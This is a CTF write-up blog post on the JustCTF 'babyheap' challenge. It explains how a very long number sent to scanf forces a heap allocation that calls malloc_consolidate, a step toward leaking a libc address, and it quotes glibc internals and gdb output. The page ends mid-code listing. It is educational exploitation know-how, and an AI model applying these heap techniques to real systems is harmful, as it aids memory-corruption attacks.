<!DOCTYPE html><html lang="it" data-astro-cid-4dqtj3le> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="manifest" href="/site.webmanifest"><meta name="generator" content="Astro v5.17.2"><meta name="description" content="Articolo di ub1k @ Pwnissa"><title>Babyheap: JustCTF - Chapter 2</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css"><style>.footer[data-astro-cid-sz7xmlte]{background:var(--bg-secondary);padding:60px 0 20px;border-top:1px solid var(--card-border);margin-top:0}.footer-content[data-astro-cid-sz7xmlte]{max-width:1200px;margin:0 auto;padding:0 20px;text-align:center}.footer[data-astro-cid-sz7xmlte] h2[data-astro-cid-sz7xmlte]{font-size:2rem;margin-bottom:30px;color:var(--accent-gold)}.contact-info[data-astro-cid-sz7xmlte]{display:flex;flex-direction:column;gap:15px;font-size:1.1rem}.contact-info[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{color:var(--accent-teal);text-decoration:none;transition:color .3s ease}.contact-info[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:var(--accent-gold)}.made-by[data-astro-cid-sz7xmlte]{margin-top:15px;font-size:.75rem;color:#fff;text-align:center}.made-by[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]{color:#fff;text-decoration:none;transition:color .3s ease}.made-by[data-astro-cid-sz7xmlte] a[data-astro-cid-sz7xmlte]:hover{color:var(--accent-gold)}
</style>
<link rel="stylesheet" href="/_astro/babyheap.DdGESeJp.css"></head> <body data-astro-cid-4dqtj3le> <nav id="fixedNavbar" class="fixed-navbar" data-astro-cid-uvvofgxd> <div class="navbar-container" data-astro-cid-uvvofgxd> <div class="navbar-brand" data-astro-cid-uvvofgxd> <a href="/" data-astro-cid-uvvofgxd>Pwnissa</a> </div> <div class="navbar-menu" data-astro-cid-uvvofgxd> <a href="/blog" class="navbar-link" data-astro-cid-uvvofgxd>Blog</a><a href="/members" class="navbar-link" data-astro-cid-uvvofgxd>Members</a> </div> </div> </nav> <script type="module">let e=window.scrollY;const l=document.getElementById("fixedNavbar"),o=()=>{window.scrollY>e+5&&window.scrollY>l.offsetHeight?l.classList.add("hidden"):window.scrollY<e-5&&l.classList.remove("hidden"),e=window.scrollY};window.addEventListener("scroll",o);document.addEventListener("DOMContentLoaded",()=>{l.classList.remove("hidden")});</script>  <main class="blog-container" data-astro-cid-4dqtj3le> <div class="blog-header" data-astro-cid-4dqtj3le> <a href="/" class="back-link" data-astro-cid-4dqtj3le>‚Üê Torna alla home</a> <div class="article-meta" data-astro-cid-4dqtj3le> <h1 data-astro-cid-4dqtj3le>Babyheap: JustCTF - Chapter 2</h1> <div class="meta-info" data-astro-cid-4dqtj3le> <span class="author" data-astro-cid-4dqtj3le>di ub1k</span> <span class="date" data-astro-cid-4dqtj3le>21/10/2025</span> <div class="tags" data-astro-cid-4dqtj3le> <span class="tag pwn" data-astro-cid-4dqtj3le>pwn</span><span class="tag heap" data-astro-cid-4dqtj3le>heap</span><span class="tag exit_funcs" data-astro-cid-4dqtj3le>exit_funcs</span> </div> </div> </div> </div> <article class="article-content" data-astro-cid-4dqtj3le> <p>Let‚Äôs tackle the next chapter of babyheap, this one is a bit more exotic‚Ä¶</p>
<h1 id="scanf-and-black-magic">scanf and black magic</h1>
<p>Let‚Äôs examine the menu‚Äôs <code>scanf</code> input function.<br/>
<strong>Question:</strong> how can you send it an arbitrarily long number without triggering a buffer overflow?<br/>
<strong>Answer:</strong> it uses the heap.</p>
<h2 id="ocean-of-scanf">Ocean of scanf</h2>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//babyheap main function</span></span>
<span class="line"><span style="color:#50FA7B">printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">&quot;</span><span style="color:#F1FA8C">Menu:</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">1) Create</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">2) Read</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">3) Update</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">4) Delete</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">0) Quit</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">&gt; </span><span style="color:#E9F284">&quot;</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#FF79C6">if</span><span style="color:#F8F8F2"> ( (</span><span style="color:#FF79C6">unsigned</span><span style="color:#FF79C6"> int</span><span style="color:#F8F8F2">)</span><span style="color:#50FA7B">__isoc99_scanf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">&quot;</span><span style="color:#BD93F9"> %d</span><span style="color:#E9F284">&quot;</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">&amp;</span><span style="color:#FFB86C;font-style:italic">v4</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">!=</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2"> )</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#50FA7B">	puts</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">&quot;</span><span style="color:#F1FA8C">Invalid input</span><span style="color:#E9F284">&quot;</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#50FA7B">	exit</span><span style="color:#F8F8F2">(</span><span style="color:#BD93F9">0</span><span style="color:#F8F8F2">);</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
<p>But if <code>scanf()</code> always uses the heap then why don‚Äôt we see tcache chunks in the free list after every execution? To understand what is going on, let‚Äôs start <code>gdb</code> and set a breakpoint at <code>*malloc</code>.
If we send 42 to scanf, malloc doesn‚Äôt get called, but when we send a very big number, the program breaks at a malloc call! Using <code>finish</code> we can exit the malloc call and see the function that executes it:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF79C6">   0x</span><span style="color:#BD93F9">7ffff7ca9a3b</span><span style="color:#FF79C6"> &lt;</span><span style="color:#BD93F9">__GI___libc_scratch_buffer_grow_preserve</span><span style="color:#FF79C6">+</span><span style="color:#BD93F9">107</span><span style="color:#FF79C6">&gt;</span><span style="color:#F8F8F2">:       call   </span><span style="color:#BD93F9">QWORD</span><span style="color:#BD93F9"> PTR</span><span style="color:#F8F8F2"> [rip</span><span style="color:#FF79C6">+0x</span><span style="color:#BD93F9">15f597</span><span style="color:#F8F8F2">]        </span><span style="color:#6272A4"># 0x7ffff7e08fd8 (malloc)</span></span>
<span class="line"><span style="color:#FF79C6">=&gt;</span><span style="color:#FF79C6"> 0x</span><span style="color:#BD93F9">7ffff7ca9a41</span><span style="color:#FF79C6"> &lt;</span><span style="color:#BD93F9">__GI___libc_scratch_buffer_grow_preserve</span><span style="color:#FF79C6">+</span><span style="color:#BD93F9">113</span><span style="color:#FF79C6">&gt;</span><span style="color:#F8F8F2">:       mov    rdi,rax</span></span></code></pre>
<p><code>libc_scratch_buffer_grow_preserve()</code> Is our perpetrator then, but let‚Äôs step back and follow the implementation of <code>vfscanf()</code>: after ‚Äú%d‚Äù gets read by vfscanf, it enters a loop where every iteration a char is taken from stdin using <code>incchr()</code> and moves the character into a <em>charbuffer</em> by calling <code>char_buffer_add()</code> till an EOF is found or its width becomes zero.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals https://elixir.bootlin.com/glibc/glibc-2.42.9000/source/stdio-common/vfscanf-internal.c#L1823</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">while</span><span style="color:#F8F8F2"> (c </span><span style="color:#FF79C6">!=</span><span style="color:#F8F8F2"> EOF </span><span style="color:#FF79C6">&amp;&amp;</span><span style="color:#F8F8F2"> width </span><span style="color:#FF79C6">!=</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#F8F8F2">	... a LOT of stuff ...	</span></span>
<span class="line"><span style="color:#F8F8F2">	</span></span>
<span class="line"><span style="color:#50FA7B">	char_buffer_add</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2">charbuf, c); </span><span style="color:#FF79C6">&lt;--</span><span style="color:#F8F8F2"> wrapper around wrapper around grow_preserve</span></span>
<span class="line"><span style="color:#FF79C6">	if</span><span style="color:#F8F8F2"> (width </span><span style="color:#FF79C6">&gt;</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#FF79C6">		--</span><span style="color:#F8F8F2">width;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#F8F8F2">	c </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> inchar</span><span style="color:#F8F8F2"> ();</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
<p>It then adds a zero byte at the end to transform the number into a string and executes <code>__strtol_internal</code>, this function transforms the string into a <strong>long integer</strong>.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals https://elixir.bootlin.com/glibc/glibc-2.42.9000/source/stdio-common/vfscanf-internal.c#L1932</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6272A4">/* Convert the number.  */</span></span>
<span class="line"><span style="color:#50FA7B">char_buffer_add</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">&amp;</span><span style="color:#FFB86C;font-style:italic">charbuf</span><span style="color:#F8F8F2">, </span><span style="color:#50FA7B">L_</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">&#39;</span><span style="color:#FF79C6">\0</span><span style="color:#E9F284">&#39;</span><span style="color:#F8F8F2">));</span></span>
<span class="line"><span style="color:#FF79C6">if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">char_buffer_error</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">&amp;</span><span style="color:#FFB86C;font-style:italic">charbuf</span><span style="color:#F8F8F2">))</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#F8F8F2">  ... error stuff ...</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"><span style="color:#FF79C6">if</span><span style="color:#F8F8F2"> (need_longlong </span><span style="color:#FF79C6">&amp;&amp;</span><span style="color:#F8F8F2"> (flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> LONGDBL))</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#F8F8F2">  ... </span><span style="color:#FF79C6">if</span><span style="color:#F8F8F2"> a longlong is needed stuff ...</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span>
<span class="line"><span style="color:#FF79C6">else</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#FF79C6">  if</span><span style="color:#F8F8F2"> (flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> NUMBER_SIGNED)</span></span>
<span class="line"><span style="color:#F8F8F2">num.l </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> __strtol_internal</span><span style="color:#6272A4">                                    //&lt;-- HERE</span></span>
<span class="line"><span style="color:#F8F8F2">  (</span><span style="color:#50FA7B">char_buffer_start</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2">charbuf), </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2">tw, base, flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> GROUP);</span></span>
<span class="line"><span style="color:#FF79C6">  else</span></span>
<span class="line"><span style="color:#F8F8F2">num.ul </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> __strtoul_internal</span></span>
<span class="line"><span style="color:#F8F8F2">  (</span><span style="color:#50FA7B">char_buffer_start</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2">charbuf), </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2">tw, base, flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> GROUP);</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
<p>But by setting ‚Äú%d‚Äù didn‚Äôt we want to save an integer? Why is the string converted into a long integer? Don‚Äôt worry, shortly after the above code the number gets cast into the right format and moved into the argument given to <code>scanf()</code>:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals https://elixir.bootlin.com/glibc/glibc-2.42.9000/source/stdio-common/vfscanf-internal.c#L1961</span></span>
<span class="line"><span style="color:#F8F8F2"> </span></span>
<span class="line"><span style="color:#FF79C6">if</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">!</span><span style="color:#F8F8F2">(flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> SUPPRESS))</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#FF79C6">	if</span><span style="color:#F8F8F2"> (flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> NUMBER_SIGNED)</span></span>
<span class="line"><span style="color:#F8F8F2">	{</span></span>
<span class="line"><span style="color:#FF79C6">	  if</span><span style="color:#F8F8F2"> (need_longlong </span><span style="color:#FF79C6">&amp;&amp;</span><span style="color:#F8F8F2"> (flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> LONGDBL))</span></span>
<span class="line"><span style="color:#FF79C6">		*</span><span style="color:#50FA7B">ARG</span><span style="color:#F8F8F2"> (LONGLONG </span><span style="color:#FF79C6">int</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> num.q;</span></span>
<span class="line"><span style="color:#FF79C6">	  else</span><span style="color:#FF79C6"> if</span><span style="color:#F8F8F2"> (need_long </span><span style="color:#FF79C6">&amp;&amp;</span><span style="color:#F8F8F2"> (flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> LONG))</span></span>
<span class="line"><span style="color:#FF79C6">		*</span><span style="color:#50FA7B">ARG</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">long</span><span style="color:#FF79C6"> int</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> num.l;</span></span>
<span class="line"><span style="color:#FF79C6">	  else</span><span style="color:#FF79C6"> if</span><span style="color:#F8F8F2"> (flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> SHORT)</span></span>
<span class="line"><span style="color:#FF79C6">		*</span><span style="color:#50FA7B">ARG</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">short</span><span style="color:#FF79C6"> int</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">short</span><span style="color:#FF79C6"> int</span><span style="color:#F8F8F2">) num.l;</span></span>
<span class="line"><span style="color:#FF79C6">	  else</span><span style="color:#FF79C6"> if</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">!</span><span style="color:#F8F8F2">(flags </span><span style="color:#FF79C6">&amp;</span><span style="color:#F8F8F2"> CHAR))</span></span>
<span class="line"><span style="color:#FF79C6">		*</span><span style="color:#50FA7B">ARG</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">int</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">int</span><span style="color:#F8F8F2">) num.l;</span><span style="color:#6272A4">                    //&lt;-- long to int and stored in the</span></span>
<span class="line"><span style="color:#FF79C6">	  else</span><span style="color:#6272A4">                                             //    argument given to scanf</span></span>
<span class="line"><span style="color:#FF79C6">		*</span><span style="color:#50FA7B">ARG</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">signed</span><span style="color:#FF79C6"> char</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">) </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">signed</span><span style="color:#FF79C6"> char</span><span style="color:#F8F8F2">) num.ul;</span></span>
<span class="line"><span style="color:#F8F8F2">	}</span></span>
<span class="line"><span style="color:#FF79C6">	else</span></span>
<span class="line"><span style="color:#F8F8F2">	{</span></span>
<span class="line"><span style="color:#F8F8F2">	  ... same as above but </span><span style="color:#FF79C6">unsigned</span><span style="color:#F8F8F2"> ...</span></span>
<span class="line"><span style="color:#F8F8F2">	}</span></span>
<span class="line"><span style="color:#F8F8F2">	</span></span>
<span class="line"><span style="color:#F8F8F2">	... more stuff...</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
<p>Now we know how a number gets transformed into an integer. But we <strong>ignored a key aspect</strong> of this code: <code>char_buffer_add</code> moves characters from stdin into a buffer, so let‚Äôs understand how the function works.
This function is a wrapper around <code>char_buffer_add_slow()</code> which uses a <strong>scratch_buffer</strong> to save data:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals https://elixir.bootlin.com/glibc/glibc-2.42.9000/source/include/scratch_buffer.h#L66</span></span>
<span class="line"><span style="color:#FF79C6">struct</span><span style="color:#F8F8F2"> scratch_buffer {</span></span>
<span class="line"><span style="color:#FF79C6">  void</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">data;</span><span style="color:#6272A4">    /* Pointer to the beginning of the scratch area.  */</span></span>
<span class="line"><span style="color:#FF79C6">  size_t</span><span style="color:#F8F8F2"> length;</span><span style="color:#6272A4"> /* Allocated space at the data pointer, in bytes.  */</span></span>
<span class="line"><span style="color:#FF79C6">  union</span><span style="color:#F8F8F2"> { </span><span style="color:#8BE9FD;font-style:italic">max_align_t</span><span style="color:#F8F8F2"> __align; </span><span style="color:#FF79C6">char</span><span style="color:#F8F8F2"> __c[</span><span style="color:#BD93F9">1024</span><span style="color:#F8F8F2">]; } __space;</span></span>
<span class="line"><span style="color:#F8F8F2">};</span></span></code></pre>
<p>This struct contains a <strong>pointer</strong> to a writable buffer (<code>*data</code>), the <strong>length</strong> of said buffer (<code>length</code>), and the <strong>1024 byte memory area</strong> itself (<code>__space</code>).
In the initialization process of the <code>scratch_buffer</code> the address of the memory area gets stored in <code>*data</code>, if more than 1024 bytes must be stored, <code>char_buffer_add_slow()</code> will call <code>__libc_scratch_buffer_grow_preserve</code>, this functions allocates a new buffer in the heap with double the size and modifies the <code>*data</code> pointer and the length.
This is why malloc gets called only when big numbers are sent to <code>scanf</code>, we need more than 1024 characters to trigger the heap allocation.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals</span></span>
<span class="line"><span style="color:#50FA7B">__libc_scratch_buffer_grow_preserve</span><span style="color:#F8F8F2"> (</span><span style="color:#FF79C6">struct</span><span style="color:#F8F8F2"> scratch_buffer </span><span style="color:#FF79C6">*</span><span style="color:#FFB86C;font-style:italic">buffer</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#FF79C6">	size_t</span><span style="color:#F8F8F2"> new_length </span><span style="color:#FF79C6">=</span><span style="color:#BD93F9"> 2</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2"> buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">length; </span><span style="color:#FF79C6">&lt;---</span><span style="color:#BD93F9"> 1024</span><span style="color:#FF79C6"> *</span><span style="color:#BD93F9"> 2</span></span>
<span class="line"><span style="color:#FF79C6">	void</span><span style="color:#FF79C6"> *</span><span style="color:#F8F8F2">new_ptr;</span></span>
<span class="line"><span style="color:#F8F8F2">	</span></span>
<span class="line"><span style="color:#FF79C6">	if</span><span style="color:#F8F8F2"> (buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">data </span><span style="color:#FF79C6">==</span><span style="color:#F8F8F2"> buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">__space.__c)</span></span>
<span class="line"><span style="color:#F8F8F2">    {</span></span>
<span class="line"><span style="color:#6272A4">	/* Move buffer to the heap.  No overflow is possible because</span></span>
<span class="line"><span style="color:#6272A4">	buffer-&gt;length describes a small buffer on the stack.  */</span></span>
<span class="line"><span style="color:#F8F8F2">	new_ptr </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> malloc</span><span style="color:#F8F8F2"> (new_length);</span><span style="color:#6272A4">                   //&lt;-- HERE WE BREAKED</span></span>
<span class="line"><span style="color:#FF79C6">	if</span><span style="color:#F8F8F2"> (new_ptr </span><span style="color:#FF79C6">==</span><span style="color:#BD93F9"> NULL</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#FF79C6">		return</span><span style="color:#BD93F9"> false</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#50FA7B">	memcpy</span><span style="color:#F8F8F2"> (new_ptr, buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">__space.__c, buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">length);</span></span>
<span class="line"><span style="color:#F8F8F2">    }</span></span>
<span class="line"><span style="color:#FF79C6">	else</span></span>
<span class="line"><span style="color:#F8F8F2">    {</span></span>
<span class="line"><span style="color:#6272A4">	/* Buffer was already on the heap.  Check for overflow.  */</span></span>
<span class="line"><span style="color:#FF79C6">	if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">__glibc_likely</span><span style="color:#F8F8F2"> (new_length </span><span style="color:#FF79C6">&gt;=</span><span style="color:#F8F8F2"> buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">length))</span></span>
<span class="line"><span style="color:#F8F8F2">		new_ptr </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> realloc</span><span style="color:#F8F8F2"> (buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">data, new_length);</span></span>
<span class="line"><span style="color:#FF79C6">    else</span></span>
<span class="line"><span style="color:#F8F8F2">	{</span></span>
<span class="line"><span style="color:#F8F8F2">		... error stuff ...</span></span>
<span class="line"><span style="color:#F8F8F2">	}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF79C6">    if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">__glibc_unlikely</span><span style="color:#F8F8F2"> (new_ptr </span><span style="color:#FF79C6">==</span><span style="color:#BD93F9"> NULL</span><span style="color:#F8F8F2">))</span></span>
<span class="line"><span style="color:#F8F8F2">	{</span></span>
<span class="line"><span style="color:#6272A4">		/* Deallocate, but buffer must remain valid to free.  */</span></span>
<span class="line"><span style="color:#50FA7B">		free</span><span style="color:#F8F8F2"> (buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">data);</span></span>
<span class="line"><span style="color:#50FA7B">		scratch_buffer_init</span><span style="color:#F8F8F2"> (buffer);</span></span>
<span class="line"><span style="color:#FF79C6">		return</span><span style="color:#BD93F9"> false</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#F8F8F2">	}</span></span>
<span class="line"><span style="color:#F8F8F2">    }</span></span>
<span class="line"><span style="color:#F8F8F2">    </span></span>
<span class="line"><span style="color:#6272A4">	/* Install new heap-based buffer.  */</span></span>
<span class="line"><span style="color:#F8F8F2">	buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">data </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> new_ptr;</span></span>
<span class="line"><span style="color:#F8F8F2">	buffer</span><span style="color:#FF79C6">-&gt;</span><span style="color:#F8F8F2">length </span><span style="color:#FF79C6">=</span><span style="color:#F8F8F2"> new_length;</span></span>
<span class="line"><span style="color:#FF79C6">	return</span><span style="color:#BD93F9"> true</span><span style="color:#F8F8F2">;</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
<p>Now we know in which situation <code>malloc</code> gets called from <code>scanf</code>, but how can this be helpful to our purpose of <strong>leaking a libc address pointer?</strong> The scratchpad gets freed after usage and removed from the heap, so how can we maintain a freed chunk in the small or large bins with this knowledge? It seems that our deep dive is not finished yet‚Ä¶ enter the depths of malloc.</p>
<h2 id="deep-into-malloc">Deep into malloc</h2>
<p>Looking at the <code>malloc()</code> implementation inside <code>libc</code>, we notice that if the requested chunk is larger than the biggest chunk size stored in the <code>smallbins</code>, <code>malloc_consolidate()</code> is called.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals</span></span>
<span class="line"><span style="color:#FF79C6">static</span><span style="color:#FF79C6"> void</span><span style="color:#FF79C6"> *</span></span>
<span class="line"><span style="color:#50FA7B">_int_malloc</span><span style="color:#F8F8F2"> (mstate </span><span style="color:#FFB86C;font-style:italic">av</span><span style="color:#F8F8F2">, </span><span style="color:#FF79C6">size_t</span><span style="color:#FFB86C;font-style:italic"> bytes</span><span style="color:#F8F8F2">)</span></span>
<span class="line"><span style="color:#F8F8F2">{</span></span>
<span class="line"><span style="color:#F8F8F2">	INTERNAL_SIZE_T nb;</span><span style="color:#6272A4">               /* normalized request size */</span></span>
<span class="line"><span style="color:#F8F8F2">	</span></span>
<span class="line"><span style="color:#F8F8F2">	... to much stuff here, like a loooot ...</span></span>
<span class="line"><span style="color:#F8F8F2">	</span></span>
<span class="line"><span style="color:#FF79C6">	if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">in_smallbin_range</span><span style="color:#F8F8F2"> (nb))</span></span>
<span class="line"><span style="color:#F8F8F2">	{</span></span>
<span class="line"><span style="color:#F8F8F2">	    ... a bit of stuff here ...</span></span>
<span class="line"><span style="color:#F8F8F2">	} </span></span>
<span class="line"><span style="color:#FF79C6">    else</span></span>
<span class="line"><span style="color:#F8F8F2">    {</span></span>
<span class="line"><span style="color:#6272A4">	    /*</span></span>
<span class="line"><span style="color:#6272A4">	     If this is a large request, consolidate fastbins before continuing.</span></span>
<span class="line"><span style="color:#6272A4">	     While it might look excessive to kill all fastbins before</span></span>
<span class="line"><span style="color:#6272A4">	     even seeing if there is space available, this avoids</span></span>
<span class="line"><span style="color:#6272A4">	     fragmentation problems normally associated with fastbins.</span></span>
<span class="line"><span style="color:#6272A4">	     [...]</span></span>
<span class="line"><span style="color:#6272A4">		*/</span></span>
<span class="line"><span style="color:#F8F8F2">		</span></span>
<span class="line"><span style="color:#F8F8F2">	    idx </span><span style="color:#FF79C6">=</span><span style="color:#50FA7B"> largebin_index</span><span style="color:#F8F8F2"> (nb);</span></span>
<span class="line"><span style="color:#FF79C6">	    if</span><span style="color:#F8F8F2"> (</span><span style="color:#50FA7B">have_fastchunks</span><span style="color:#F8F8F2"> (av))</span></span>
<span class="line"><span style="color:#50FA7B">        malloc_consolidate</span><span style="color:#F8F8F2"> (av);</span><span style="color:#6272A4">     //&lt;--- oh look, malloc_consolidate</span></span>
<span class="line"><span style="color:#F8F8F2">    }</span></span>
<span class="line"><span style="color:#F8F8F2">    </span></span>
<span class="line"><span style="color:#F8F8F2">    ... a league of legends lootbox full of stuff here ...</span></span>
<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
<p>The macro <code>in_smallbin_range(nb)</code> is a simple check that returns if the size of the chunk is small enough to stay in smallbins, by looking below we can calculate the smallbin max chunk size as 0x400.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word" tabindex="0" data-language="c"><code><span class="line"><span style="color:#6272A4">//glibc internals</span></span>
<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> NBINS</span><span style="color:#BD93F9">             128</span></span>
<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> NSMALLBINS</span><span style="color:#BD93F9">         64</span></span>
<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> SMALLBIN_WIDTH</span><span style="color:#F8F8F2">    MALLOC_ALIGNMENT ` \\ normally </span><span style="color:#BD93F9">16</span></span>
<span class="line"><span style="color:#FF79C6">#define</span><span style="color:#50FA7B"> SMALLBIN_CORRECTION</span><span style="color:#F8F8F2"> (MALLOC_ALIGNMENT </span><span style="color:#FF79C6">&gt;</span><span style="color:#F8F8F2"> CHUNK_HDR_SZ)</span></span>
